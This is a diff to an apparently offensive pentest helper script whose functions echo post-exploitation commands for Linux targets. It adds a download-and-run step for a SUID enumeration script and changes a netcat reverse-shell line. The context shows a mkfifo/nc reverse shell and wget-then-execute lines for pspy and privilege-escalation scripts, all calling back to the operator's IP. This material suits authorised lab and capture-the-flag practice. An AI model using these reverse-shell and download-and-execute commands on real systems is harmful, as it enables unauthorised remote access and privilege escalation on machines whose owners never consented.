@@ -295,6 +295,7 @@ mtInitialLinux () {
   echo "wget http://$(getip a):$1/useful_files/files/linux/lse.sh"
   echo "wget http://$(getip a):$1/useful_files/files/linux/LinEnum.sh"
   echo "wget http://$(getip a):$1/useful_files/files/linux/linux-exploit-suggester.sh" 
+  echo "wget http://$(getip a):$1/useful_files/files/linux/suid3num.py" 
   echo "# >>> run <<<<"
   echo "mkdir output 2>/dev/null"
   echo "bash mylinenum.sh > ./output/mylinenum.txt &"
@@ -302,6 +303,7 @@ mtInitialLinux () {
   echo "bash lse.sh > ./output/lse.txt &"
   echo "bash LinEnum.sh > ./output/LinEnum.txt &"
   echo "bash linux-exploit-suggester.sh > ./output/linux-exploit-suggester.txt &"
+  echo "python3 suid3num.py > ./output/suid3num.txt &"
   echo 
   echo "# >>>> PSPY <<<<" 
   echo "wget http://$(getip a):$1/useful_files/files/linux/pspy32 && chmod +x pspy32 && ./pspy32 > ./output/pspy.txt &" 
@@ -501,7 +503,7 @@ function mtshell {
 
     echo
     echo ">>>> Netcat <<<<"
-    echo "nc -e /bin/sh $(getip a) $1"
+    echo "nc -e /bin/sh $(getip a) $1    # also try '-e bash' '-e sh'"      
     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(getip a) $1 >/tmp/f"
 
 
